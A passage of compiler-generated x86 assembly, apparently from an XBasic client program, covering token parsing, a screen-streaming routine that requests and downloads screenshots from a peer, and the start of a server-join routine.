	mov	ebx,d[ebp-52]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.001D.client			;;; i154
;
; [497] IF str${p} == term THEN
	mov	eax,d[ebp-48]			;;; i665
	mov	edx,d[ebp+8]			;;; i665
	movzx	eax,b[edx+eax]			;;; i464
	mov	ebx,d[ebp+12]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> else.001E.client			;;; i219
;
; [498] msg$ = LEFT$(str$,p)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-48]			;;; i665
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [499] INC p
	inc	d[ebp-48]			;;; i84
;
; [500] str$ = RIGHT$(str$,len-p)
	sub	esp,64			;;; i487
	mov	eax,[ebp+8]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-48]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [501] RETURN msg$
	mov	eax,[ebp-44]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func42.client			;;; i258
;
; [502] END IF
else.001E.client:
end.if.001E.client:
;
; [503] NEXT p
do.next.001D.client:
	inc	d[ebp-48]			;;; i229
	jmp	for.001D.client			;;; i231
end.for.001D.client:
;
; [505] msg$ = str$
	mov	eax,[ebp+8]			;;; i665
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [506] str$ = ""
	xor	eax,eax			;;; i3
	lea	ebx,[ebp+8]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [507] RETURN msg$
	mov	eax,[ebp-44]			;;; i665
	call	%_clone.a0			;;; i870
	jmp	end.func42.client			;;; i258
;
; [508] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.GetTokenEx.client:  ;;; Function end label for Assembly Programmers.
end.func42.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func42.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func42.client:
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  GetTokenEx ()  *****
;  *****
;
; [510] FUNCTION streamscreen (idx)
.code
;
#ifdef streamscreen.idx
#undef streamscreen.idx
#endif
#define streamscreen.idx ebp+8	; exposes function argument 'idx'
;
align 16
_streamscreen.client@4:
;  *****
;  *****  FUNCTION  streamscreen ()  *****
;  *****
func45.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func45.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.95:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.95			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,112			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,36				;;; ..
	xor	eax,eax			;;; ...
A.96:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.96			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+540]			;;; i125a
	lea	ecx,[esp+568]			;;; i125b
	lea	edx,[esp+596]			;;; i125c
	lea	edi,[esp+1136]			;;; i125d
	mov	d[ebp-52],eax			;;; i670
	mov	d[ebp-56],ebx			;;; i670
	mov	d[ebp-96],ecx			;;; i670
	mov	d[ebp-112],edx			;;; i670
	mov	d[ebp-124],edi			;;; i670
funcBody45.client:
;
; [511] SHARED APPLSTATUS
data section 'globals$shared'
align	4
%APPLSTATUS.client:	db 4 dup ?
.code
;
; [512] STRING srcfile,ipaddress
#ifdef streamscreen.srcfile
#undef streamscreen.srcfile
#endif
#define streamscreen.srcfile ebp-40	; exposes local variable 'srcfile'
;
#ifdef streamscreen.ipaddress
#undef streamscreen.ipaddress
#endif
#define streamscreen.ipaddress ebp-44	; exposes local variable 'ipaddress'
;
;
; [513] STATIC n
data section 'globals$statics'
align	4
%45%n.client:	db 4 dup ?
.code
;
; [514] TP2PFILE file
; .composites = ebp-48	; internal variable
#ifdef streamscreen.file
#undef streamscreen.file
#endif
#define streamscreen.file ebp-52	; exposes local variable 'file'
;
;
; [515] TP2P p2p
#ifdef streamscreen.p2p
#undef streamscreen.p2p
#endif
#define streamscreen.p2p ebp-56	; exposes local variable 'p2p'
;
;
; [518] IFT #stream THEN RETURN $$FALSE
	mov	eax,d[%#stream.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.001F.client			;;; i221
	mov	eax,0			;;; i659
	jmp	end.func45.client			;;; i258
else.001F.client:
end.if.001F.client:
;
; [519] #stream = $$TRUE
	mov	eax,-1			;;; i659
	mov	d[%#stream.client],eax			;;; i668
;
; [521] getSPServer (idx,@ipaddress,port,password$,socket)
#ifdef streamscreen.port
#undef streamscreen.port
#endif
#define streamscreen.port ebp-60	; exposes local variable 'port'
;
#ifdef streamscreen.password$
#undef streamscreen.password$
#endif
#define streamscreen.password$ ebp-64	; exposes local variable 'password$'
;
	mov	eax,d[ebp-64]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk45.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
#ifdef streamscreen.socket
#undef streamscreen.socket
#endif
#define streamscreen.socket ebp-76	; exposes local variable 'socket'
;
	push	[ebp-76]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	[ebp-60]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func48.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-44],ecx			;;; i670
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	add	esp,20			;;; i633
;
; [522] CPrint ($$main,"* initiating stream")
	mov	eax,addr @_string.0196.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [523] auth$ = GetLastErrorStr()
#ifdef streamscreen.auth$
#undef streamscreen.auth$
#endif
#define streamscreen.auth$ ebp-80	; exposes local variable 'auth$'
;
	call	func43.client			;;; i619
	lea	ebx,[ebp-80]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [524] IFZ auth$ THEN auth$ = "none"
	mov	eax,[ebp-80]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.82			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0020.client			;;; i192
A.82:
	mov	eax,addr @_string.0198.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-80]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.0020.client:
end.if.0020.client:
;
; [526] IF newP2P(@p2p) THEN
	mov	eax,d[ebp-56]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.0021.client			;;; i221
;
; [527] auth = @p2p.GetAdler(&auth$,LEN(auth$))
#ifdef streamscreen.auth
#undef streamscreen.auth
#endif
#define streamscreen.auth ebp-84	; exposes local variable 'auth'
;
	mov	eax,d[ebp-56]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.83			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-80]			;;; i642
; .xstk45.0001 = ebp-92	; internal variable
	mov	d[ebp-92],eax			;;; i670
	mov	eax,d[ebp-80]			;;; i665
	test	eax,eax			;;; i593
	jz	> A.84			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.84:
	push	eax			;;; i667a
	push	[ebp-92]			;;; i674a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
A.83:
	mov	d[ebp-84],eax			;;; i670
;
; [528] @p2p.Free(p2p)
	mov	eax,d[ebp-56]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.85			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
; .compositeArg.0 = ebp-96	; internal variable
	mov	edi,d[ebp-96]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,28			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	push	eax			;;; i667a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
A.85:
;
; [529] fail = 0
#ifdef streamscreen.fail
#undef streamscreen.fail
#endif
#define streamscreen.fail ebp-100	; exposes local variable 'fail'
;
	mov	eax,0			;;; i659
	mov	d[ebp-100],eax			;;; i670
;
; [530] ELSE
	jmp	end.if.0021.client			;;; i107
else.0021.client:
;
; [531] fail = 1
	mov	eax,1			;;; i659
	mov	d[ebp-100],eax			;;; i670
;
; [532] END IF
end.if.0021.client:
;
; [534] c = 0
#ifdef streamscreen.c
#undef streamscreen.c
#endif
#define streamscreen.c ebp-104	; exposes local variable 'c'
;
	mov	eax,0			;;; i659
	mov	d[ebp-104],eax			;;; i670
;
; [535] DO UNTIL fail
align 8
do.0022.client:
	mov	eax,d[ebp-100]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> end.do.0022.client			;;; i195
;
; [536] IF WaitForSingleObject (#hsmDownL,30000) != $$WAIT_TIMEOUT THEN
	push	30000			;;; i656a
	push	[%#hsmDownL.client]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	je	>> else.0023.client			;;; i219
;
; [537] INC c: IF c > 5 THEN c = 0
	inc	d[ebp-104]			;;; i84
	mov	eax,d[ebp-104]			;;; i665
	cmp	eax,5			;;; i684a
	jle	>> else.0024.client			;;; i219
	mov	eax,0			;;; i659
	mov	d[ebp-104],eax			;;; i670
else.0024.client:
end.if.0024.client:
;
; [539] srcfile = $$SR_SCRCAP + STRING$(c)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-104]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.2D2F.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [540] SendSMessage (idx,"capscr "+srcfile+","+STRING$(#streamq))
	mov	eax,addr @_string.019F.client			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-72],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%#streamq.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-72]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [541] IFT #stream THEN Sleep (1100)
	mov	eax,d[%#stream.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0025.client			;;; i221
	push	1100			;;; i656a
	call	_Sleep@4			;;; i619
else.0025.client:
end.if.0025.client:
;
; [543] SendSMessage (idx,"listen "+STRING$(auth)+","+STRING$(#streamp))
	sub	esp,64			;;; i487
	mov	eax,d[ebp-84]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0163.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0164.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-72],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,d[%#streamp.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-72]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [544] Sleep (200)
	push	200			;;; i656a
	call	_Sleep@4			;;; i619
;
; [546] file.auth = auth
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-84]			;;; i665
	mov	d[eax+3],ebx			;;; i13b
;
; [547] file.srcfile = srcfile
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,[ebp-40]			;;; i665
	lea	edi,[eax+7]			;;; i9b
	mov	esi,ebx			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.v			;;; i12
;
; [548] file.desfile = "tmp"+STRING$(n)+".jpg"
	sub	esp,64			;;; i487
	mov	eax,d[%45%n.client]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_string.xlong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.01A3.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.01A4.client			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,d[ebp-52]			;;; i665
	lea	edi,[ebx+262]			;;; i9b
	mov	esi,eax			;;; i10
	mov	ecx,255			;;; i11
	call	%_assignCompositeStringlet.s			;;; i12
;
; [549] file.start = 0
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+517],ebx			;;; i13b
;
; [550] file.end = 0
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+521],ebx			;;; i13b
;
; [551] file.flags = 0
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,0			;;; i659
	mov	b[eax+538],bl			;;; i13b
;
; [552] file.blocks = 0
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+533],ebx			;;; i13b
;
; [554] IF newP2P(@p2p) THEN
	mov	eax,d[ebp-56]			;;; i665
	push	eax			;;; i667a
	call	_newP2P@4			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.0026.client			;;; i221
;
; [555] ret = @p2p.FileDownload (file,ipaddress,#streamp)
#ifdef streamscreen.ret
#undef streamscreen.ret
#endif
#define streamscreen.ret ebp-108	; exposes local variable 'ret'
;
	mov	eax,d[ebp-56]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.86			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i665
; .compositeArg.1 = ebp-112	; internal variable
	mov	edi,d[ebp-112]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,540			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	mov	d[ebp-92],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk45.0002 = ebp-120	; internal variable
	mov	d[ebp-120],eax			;;; i670
	push	[%#streamp.client]			;;; i672a
	push	[ebp-120]			;;; i674a
	push	[ebp-92]			;;; i674a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
A.86:
	mov	d[ebp-108],eax			;;; i670
;
; [556] @p2p.Free(p2p)
	mov	eax,d[ebp-56]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	xor	edx,edx			;;; i602
	test	eax,eax			;;; i603
	jz	>> A.87			;;; i604
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
; .compositeArg.2 = ebp-124	; internal variable
	mov	edi,d[ebp-124]			;;; i665
	mov	esi,eax			;;; i660
	mov	ecx,28			;;; i606a
	mov	eax,edi			;;; i606b
	call	%_assignComposite			;;; i607
	push	eax			;;; i667a
	mov	eax,d[ebp-72]			;;; i665
	call	eax			;;; i620
A.87:
;
; [557] ELSE
	jmp	end.if.0026.client			;;; i107
else.0026.client:
;
; [558] ret = $$FALSE
	mov	eax,0			;;; i659
	mov	d[ebp-108],eax			;;; i670
;
; [559] END IF
end.if.0026.client:
;
; [561] IFT ret THEN
	mov	eax,d[ebp-108]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0027.client			;;; i221
;
; [562] CPrint ($$main,"* download completed: "+file.desfile)
	mov	eax,d[ebp-52]			;;; i665
	lea	esi,[eax+262]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0178.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [563] ELSE
	jmp	end.if.0027.client			;;; i107
else.0027.client:
;
; [564] CPrint ($$main,"* download failed: "+file.desfile)
	mov	eax,d[ebp-52]			;;; i665
	lea	esi,[eax+262]			;;; i308
	mov	edi,255			;;; i310
	call	%_CompositeStringToString			;;; i311
	mov	eax,esi			;;; i312
	mov	ebx,addr @_string.0179.client			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [565] END IF
end.if.0027.client:
;
; [567] ReleaseSemaphore (#hsmDownL,1,NULL)
#ifdef streamscreen.NULL
#undef streamscreen.NULL
#endif
#define streamscreen.NULL ebp-128	; exposes local variable 'NULL'
;
	push	[ebp-128]			;;; i674a
	push	1			;;; i656a
	push	[%#hsmDownL.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [568] END IF
else.0023.client:
end.if.0023.client:
;
; [570] IFT #stream THEN
	mov	eax,d[%#stream.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.0028.client			;;; i221
;
; [571] INC n
	inc	d[%45%n.client]			;;; i85
;
; [572] IF ((#CONNECTED == $$TRUE) && (APPLSTATUS == $$TRUE)) THEN Sleep (#streamt)
data section 'globals$shared'
align	4
%#CONNECTED.client:	db 4 dup ?
.code
	mov	eax,d[%#CONNECTED.client]			;;; i663a
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.88			;;; i467
	not	eax			;;; i468
A.88:
;+peep
	mov	ebx,d[%APPLSTATUS.client]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.89			;;; i467
	not	ebx			;;; i468
A.89:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i220
	jz	>> else.0029.client			;;; i221
	push	[%#streamt.client]			;;; i672a
	call	_Sleep@4			;;; i619
else.0029.client:
end.if.0029.client:
;
; [573] ELSE
	jmp	end.if.0028.client			;;; i107
else.0028.client:
;
; [574] EXIT DO
	jmp	end.do.0022.client			;;; i144
;
; [575] END IF
end.if.0028.client:
;
; [576] LOOP WHILE ((#stream == $$TRUE) && (#CONNECTED == $$TRUE) && (APPLSTATUS == $$TRUE))
do.loop.0022.client:
	mov	eax,d[%#stream.client]			;;; i663a
	cmp	eax,-1			;;; i684a
;>peep
	mov	eax,0			;;; i466
	jne	> A.90			;;; i467
	not	eax			;;; i468
A.90:
;+peep
	mov	ebx,d[%#CONNECTED.client]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.91			;;; i467
	not	ebx			;;; i468
A.91:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	mov	ebx,d[%APPLSTATUS.client]			;;; i663a
	cmp	ebx,-1			;;; i684a
;>peep
	mov	ebx,0			;;; i466
	jne	> A.92			;;; i467
	not	ebx			;;; i468
A.92:
;+peep
	neg	eax			;;; i745
	rcr	eax,1			;;; i746
	sar	eax,31			;;; i747
	mov	edx,ebx			;;; i748
	neg	edx			;;; i749
	rcr	edx,1			;;; i750
	sar	edx,31			;;; i751
	and	eax,edx			;;; i752
	test	eax,eax			;;; i194
	jnz	< do.0022.client			;;; i195
end.do.0022.client:
;
; [578] CPrint ($$main,"* streaming stopped")
	mov	eax,addr @_string.01A9.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [579] #stream = $$FALSE
	mov	eax,0			;;; i659
	mov	d[%#stream.client],eax			;;; i668
;
; [580] #hstream = 0
	mov	eax,0			;;; i659
	mov	d[%#hstream.client],eax			;;; i668
;
; [581] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func45.client			;;; i258
;
; [582] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.streamscreen.client:  ;;; Function end label for Assembly Programmers.
end.func45.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func45.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func45.client:
	mov	esi,[ebp-64]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-80]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  streamscreen ()  *****
;  *****
;
; [584] FUNCTION JoinServer (idx,str$)
.code
;
#ifdef JoinServer.idx
#undef JoinServer.idx
#endif
#define JoinServer.idx ebp+8	; exposes function argument 'idx'
;
;
#ifdef JoinServer.str$
#undef JoinServer.str$
#endif
#define JoinServer.str$ ebp+12	; exposes function argument 'str$'
;
align 16
_JoinServer.client@8:
;  *****
;  *****  FUNCTION  JoinServer ()  *****
;  *****
func3A.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3A.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.100:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.100			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,172			;;; i114a
;
funcBody3A.client:
;
; [587] IFT #CONNECTED THEN
	mov	eax,d[%#CONNECTED.client]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.002A.client			;;; i221
;
; [588] CPrint ($$main,"*** disconnect first ***")
	mov	eax,addr @_string.01AE.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	200			;;; i656a
	call	func3F.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [589] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3A.client			;;; i258
;
; [590] END IF
else.002A.client:
end.if.002A.client:
;
; [592] GetToken (@str$,@server$,32)
#ifdef JoinServer.server$
#undef JoinServer.server$
#endif
#define JoinServer.server$ ebp-40	; exposes local variable 'server$'
;
	push	32			;;; i656a
	push	[ebp-40]			;;; i674a
	push	[ebp+12]			;;; i674a
	call	func35.client			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	ebx,d[esp-8]			;;; i877b
	mov	[ebp+12],ecx			;;; i670
	mov	[ebp-40],ebx			;;; i670
;
; [593] GetToken (str$,@port$,0)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk3A.0000 = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
#ifdef JoinServer.port$
#undef JoinServer.port$
#endif
#define JoinServer.port$ ebp-52	; exposes local variable 'port$'
;
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	call	func35.client			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-52],ecx			;;; i670
	add	esp,12			;;; i633
;
; [594] port = XLONG (port$)
#ifdef JoinServer.port
#undef JoinServer.port
#endif
#define JoinServer.port ebp-56	; exposes local variable 'port'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp-52]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.v			;;; i492a
	add	esp,64			;;; i600
	mov	d[ebp-56],eax			;;; i670
;
; [595] IFZ port THEN port = $$SR_LPort
	mov	eax,d[ebp-56]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.002B.client			;;; i195
	mov	eax,404			;;; i659
	mov	d[ebp-56],eax			;;; i670
else.002B.client:
end.if.002B.client:
;
; [596] idx = 0
	mov	eax,0			;;; i659
	mov	d[ebp+8],eax			;;; i670
;
; [597] setSPServer (idx,server$,port,"",0)
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-48],eax			;;; i670
	push	0			;;; i656a
	push	0			;;; i665a
	push	[ebp-56]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func47.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,20			;;; i633
;
; [598] #server$ = server$
data section 'globals$shared'
align	4
%#server$.client:	db 4 dup ?
.code
	mov	eax,[ebp-40]			;;; i665
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %#server$.client			;;; i4
